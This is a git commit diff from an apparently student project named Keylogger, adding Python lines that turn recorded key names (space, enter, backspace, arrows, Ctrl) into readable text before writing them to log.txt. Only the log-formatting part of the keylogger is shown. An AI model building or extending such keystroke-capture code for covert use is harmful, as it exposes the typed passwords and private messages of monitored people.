8a9ed3753271f2460fe3765cf3d0924ea167808e
Bjohan23 <bventurajohanjh@uss.edu.pe>
2024-06-29 17:25:17 -0500

    feat: Mejoras en el registro de teclas del keylogger

--- Keylogger/keylogger.py
+++ Keylogger/keylogger.py
@@ -16,6 +16,25 @@ def convertir_string(keys):
     with open("log.txt", "w+") as logfile:
         for key in keys:
             key = str(key).replace("'", "")
+            key = str(key).replace("Key.space"," ")
+            key = str(key).replace("Key.enter","\n")
+            key = str(key).replace("Key.shift"," ")
+            key = str(key).replace("Key.alt_l"," ")
+            key = str(key).replace("ñ","n")
+            key = str(key).replace("Key.caps_lock"," [MAYUS]")
+            key = str(key).replace("Key.delete"," ")
+            key = str(key).replace("_r"," ")
+                # flechas arriba abajo etc
+            key = str(key).replace("Key.left","  ")
+            key = str(key).replace("Key.up"," ")
+            key = str(key).replace("Key.down"," ")
+            key = str(key).replace("Key.right"," ")
+            # Ctrl
+            key = str(key).replace("Key.ctrl_l"," ")
+            key = str(key).replace("x03"," ")
+            key = str(key).replace("x16"," ")
+            key = str(key).replace("Key.backspace"," [borra] ")
+            key = str(key).replace("Key.tab"," ")
             logfile.write(key)
 
         logfile.seek(0)
